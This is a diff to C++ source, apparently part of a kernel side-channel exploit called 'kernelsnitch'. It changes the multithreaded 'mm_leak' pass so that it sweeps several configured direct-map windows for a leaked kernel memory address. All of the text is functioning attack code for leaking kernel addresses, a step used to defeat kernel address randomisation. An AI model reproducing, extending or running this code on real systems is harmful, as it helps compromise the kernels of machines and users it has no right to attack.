@@ -284,30 +284,42 @@ namespace ghostlock::kernelsnitch {
         return 0;
     }
 
-    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
-        /* the leak check discards a match past the measured end, so no slice
-     * scans past it */
-        const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
-                                                  static_cast<uint64_t>(IDENTITY_END));
-        for (size_t i = 0; i < ks->thread_cnt; ++i) {
-            struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
-                calloc(1, sizeof(struct mm_leak_arg))));
-            mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
-            mm_leak_arg->range.id = i;
-            mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
-            mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
-            mm_leak_arg->try_canonical = try_canonical;
-            mm_leak_arg->sweep_tags = sweep_tags;
-            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-            if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
-                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
-            if (mm_leak_arg->range.end > ceiling)
-                mm_leak_arg->range.end = ceiling;
-            SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
+        /* physmap_info is not contiguous in the direct map, so each configured
+         * window is scanned in turn and split across the threads on its own. A
+         * family with one window behaves exactly as before. */
+        for (std::size_t w = 0; w < ghostlock::kernel::KERNELSNITCH_IDENTITY_WINDOW_COUNT; ++w) {
+            const auto window = ghostlock::kernel::KERNELSNITCH_IDENTITY_WINDOWS[w];
+            if (window.end <= window.start) continue;
+            /* the leak check discards a match past the measured end, so no slice
+             * scans past it */
+            const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                                      static_cast<uint64_t>(window.end));
+            const size_t base = static_cast<size_t>(window.start);
+            if (ceiling <= base) continue;
+            const size_t window_diff = (ceiling - base) / ks->thread_cnt;
+            if (!window_diff) continue;
+            for (size_t i = 0; i < ks->thread_cnt; ++i) {
+                struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
+                    calloc(1, sizeof(struct mm_leak_arg))));
+                mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
+                mm_leak_arg->range.id = w * ks->thread_cnt + i;
+                mm_leak_arg->range.start = base + window_diff * i;
+                mm_leak_arg->range.end = base + window_diff * (i + 1);
+                mm_leak_arg->try_canonical = try_canonical;
+                mm_leak_arg->sweep_tags = sweep_tags;
+                if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+                    mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+                if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
+                    mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+                if (mm_leak_arg->range.end > ceiling)
+                    mm_leak_arg->range.end = ceiling;
+                SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+            }
+            for (size_t i = 0; i < ks->thread_cnt; ++i)
+                pthread_join(ks->tids[i], 0);
+            if (ks->found) return;
         }
-        for (size_t i = 0; i < ks->thread_cnt; ++i)
-            pthread_join(ks->tids[i], 0);
     }
 
     /****************************************************************************************************************/
